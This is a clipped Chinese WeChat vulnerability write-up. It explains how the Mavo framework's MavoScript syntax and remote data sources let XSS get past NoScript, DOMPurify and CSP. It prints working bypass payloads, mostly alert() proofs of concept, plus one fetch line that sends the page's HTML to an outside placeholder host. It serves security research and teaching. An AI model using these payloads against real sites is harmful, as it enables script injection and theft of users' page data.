---
title: 【微信】一个帮开发者偷懒的框架，顺手把三道 XSS 防护全捅穿了
source: https://mp.weixin.qq.com/s/fueZh16TrwqIy5fvIZxepA
source_host: mp.weixin.qq.com
clip_date: 2026-10-12T08:09:48+08:00
trace_id: 959d20e0-1dd1-4fe5-8118-78c3d2a8993e
content_hash: cf2f35f7686f8d695da1fef3e4fd07b29731afec144800a739475e911d3d0265
status: synced
tags:
  - 微信
  - 漏洞分析
  - 开发工具
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: Mavo 这个"纯 HTML 写应用"的前端框架，因自制表达式语言 MavoScript 与可控数据源，可依次绕过 NoScript、DOMPurify、CSP 三道 XSS 防护，并衍生出"数据源劫持"这一新攻击面。
ai_summary_style: key-points
images_status:
  total: 3
  succeeded: 3
  failed_urls: []
notion_page_id: 3f775244-d011-810c-9683-f98d94617e2e
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> Mavo 这个"纯 HTML 写应用"的前端框架，因自制表达式语言 MavoScript 与可控数据源，可依次绕过 NoScript、DOMPurify、CSP 三道 XSS 防护，并衍生出"数据源劫持"这一新攻击面。
> 
> - **$url 直入 DOM：** Mavo 内置 $url 对象让取 GET 参数等同取属性，开发者把 {$url.spec} 塞进 href 即成 DOM XSS；有效载荷 `javascript:alert(1)%252f%252f..%252fcss-images` 双重编码斜杠，对 Mavo 是数据路径、对 JS 是注释符，一个字符串两种读法。
> - **数据源劫持：** 通过 source 参数拉取带 `Access-Control-Allow-Origin:*` 的外部 JSON，可在不碰任何代码的情况下改写页面数据，例如把 `companyURL` 设为 `javascript:alert(1)` 并渲染进 href。
> - **MavoScript 特性：** 用方括号 `[]` 求值；认 `and/or/mod` 关键字；`=` 表示比较而非赋值；字母数字下划线组成的字符串可省引号；执行包在 `with` 里且无沙箱，`[self.alert(1)]`、`[(1,alert)(1)]` 均可执行；分隔符与执行属性（mv-if/mv-value 等）可自定义。
> - **与 NoScript 的拉锯：** 依次用 `[1 and self.fetch(...)]`（`&` 作拼接符）、`[''=''or self.alert(lol)]`、`data-mv-if` 内直接跑表达式、自定义分隔符 `lolx...lolx`、href 内嵌表达式、属性夹带拆分向量，最终以"字母当运算符 + 无引号字符串"的 `[omglol mod 1 mod self.alert(1)andlol]` 突破检测。
> - **可复用思路：** 别只盯黑词正则，关注框架自定义分隔符、可作运算符的字母、无引号字符串；遇小众框架/低代码工具优先翻"表达式、数据源、自定义属性"三块文档；数据源可控时优先测劫持而非注入。

**升斗安全** *2026年10月12日 07:55*

**【文章说明】**

-   **目的**：本文内容仅为网络安全 **技术研究与教育** 目的而创作。
    
-   **红线**：严禁将本文知识用于任何 **未授权** 的非法活动。使用者必须遵守《网络安全法》等相关法律。
    
-   **责任**：任何对本文技术的滥用所引发的 **后果自负**，与本公众号及作者无关。
    
-   **免责**：内容仅供参考，作者不对其准确性、完整性作任何担保。
    

**阅读即代表您同意以上条款。**

📌这篇讲什么：一个叫 Mavo 的框架，本意是让你用纯 HTML 就能拼出交互网页。结果它顺手加的那套"新语法"，把 NoScript、DOMPurify、CSP 全绕了一遍，还顺带发明了一种叫"数据源劫持"的新漏洞。今天我站在挖洞人的视角，把这趟绕过接力赛拆给你看——里面每一招，都能直接搬进你自己的测试清单。

* * *

曾经有几位大佬演示了"用前端框架绕过 XSS 缓解"有多容易。那时候我就盯上了一个刚冒头的小框架：Mavo。它主打"不用写 JS，HTML 里写写就能出应用"，在 Smashing 杂志一发，我寻思这玩意儿安全边界得有多野，就一头扎进去了。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/1590913cb646814c.png)

## 一、第一个坑：$url 把参数直接喂进 DOM

Mavo 偷偷给你造了个 $url 对象，取 GET 参数跟取属性一样简单：$url.x 就是参数 x。方便是真方便，坑也在这——开发者随手把它塞进 href，DOM XSS 就来了。

最典型的是 CSS 工作组，他们用 Mavo 管规范下面的评论，href 里写了 {$url.spec}。要触发，得塞一个"既是合法相对路径、又能当 JS 执行"的玩意儿：

```apache
javascript:alert(1)%252f%252f..%252fcss-images
```

妙在哪儿？那两个双重编码的斜杠，对 Mavo 来说是"去 css-images 目录找数据"的路径；对 JS 来说又是注释符，把后面全注掉，最后落回 css-images 把数据加载出来、链接显示。一个字符串，两种读法——这就是绕过的最底层逻辑。

## 二、更狠的：把数据源抢过来

Mavo 还有个功能：数据源可以指向本地或远程。它官网那个 invoice 演示，能用 source 参数拉外部 JSON。只要这个 JSON 带 Access-Control-Allow-Origin:\*，攻击者就能完全接管页面数据。

我在外部 JSON 里写 "companyURL":"javascript:alert(1)"，页面用 Mavo 表达式把它填进 href——于是外部数据一加载，XSS 就落地了。这已经不是传统 XSS，是\*\*"数据源劫持"\*\*：你连代码都没碰，就把人家的页面内容改了。

## 三、MavoScript：一套"不太一样"的 JS

真正让过滤器崩掉的，是 Mavo 的表达式语言 MavoScript。它用方括号 \[\] 当求值符（跟 Angular 的 {{}} 一个意思），但语法有私货：

-   认 `and` `or` `mod` 这些关键字；
    
-   \= 是"比较"不是"赋值"；
-   字符串只由字母数字下划线组成时，可以不加引号；
    
-   执行时套在一个 `with` 里，但——没有沙箱。
    

所以 \[self.alert(1)\] 就能弹窗；想不写 window，就用 \[(1,alert)(1)\] 间接调用。它还能用 mv-expressions 自定义分隔符，property/mv-if/mv-value 这些属性里也能直接跑表达式。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/9460c7e0ae3c8b4e.png)

## 四、和 NoScript 的绕过接力赛

NoScript 的作者 Giorgio Maone 跟我联调，想堵住 Mavo。结果变成了"他补一个，我换一个"的拉锯：

-   第一版：NoScript 不认识 `and` 和方括号，我直接用 `[1 and self.fetch('//xxx'&encodeURIComponent(document.body.innerHTML))]` 把页面 HTML 发走—— `&` 在 Mavo 里是拼接符，NoScript 还当它是 JS 的 `+` 。
    
-   他加了关键字检测，我换 `[''=''or self.alert(lol)]` ：用 `=` 做相等判断、 `or` 当运算符，NoScript 照样不认。
    
-   分隔符也不要了： `<a data-mv-if='1 or self.alert(1)'>` —— `mv-if` 里直接跑表达式。
    
-   连分隔符字符都能自己定： `lolxself.alert('lol')lolx` 。
    
-   href 里嵌表达式： `<a href=[javascript&':alert(1)']>` ；再多属性夹带、和正常属性混写，把向量拆得七零八落。
    
-   最后两招最绝：Mavo 允许字母当运算符， `[self.alert(1)mod1]` 里 `mod` 后面紧跟数字，NoScript 压根没料到函数调用后还能接字母；再结合"无引号字符串 + 跟在运算符后"， `[omglol mod 1 mod self.alert(1)andlol]` 直接把检测干穿。
    

你看，每补一次，本质都是"Mavo 加了种新语法，而过滤器按老 JS 的语法在想"。

## 五、给挖洞的你能带走什么

1.  别只盯正则黑词。框架自定义的表达式分隔符、能当运算符的字母、无引号的字符串——这些才是绕过检测的盲区。
    
2.  看到"小众框架 / 低代码工具"，先翻它文档里的"表达式""数据源""自定义属性"三块，八成有戏。
    
3.  数据源可控（远程 JSON / CORS\*）的富文本、模板类功能，优先测"劫持"而不是"注入"。
    
4.  拉锯思路：一种语法被拦，就换它"另一种合法写法"——Mavo 的 `and/or/mod` 、无引号、自定义分隔符，就是现成的弹药库。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/ee04d84b1fd2045f.png)
    

* * *

写到这里，这趟绕过接力赛也算跑完了。Mavo 早停更了，但它教的那件事不过时：凡是给 HTML/JS 加新语法的框架，都在悄悄改写安全规则的边界。你手头正在测的目标，有没有这种"看起来人畜无害"的小框架？

觉得这篇对你挖洞有点启发的话：

👍 点个\*\*「赞」+「在看」，让更多猎人刷到这份绕过弹药库；🔁 顺手「转发」给你带的安全团队，第四节那串 payload 值得 internal 复盘一遍；➕ 还没「关注」的点个关注，这类"框架怎么把防护绕穿"的实战我还会接着写；💬 也欢迎「推荐」\*\*给身边做安全的朋友。
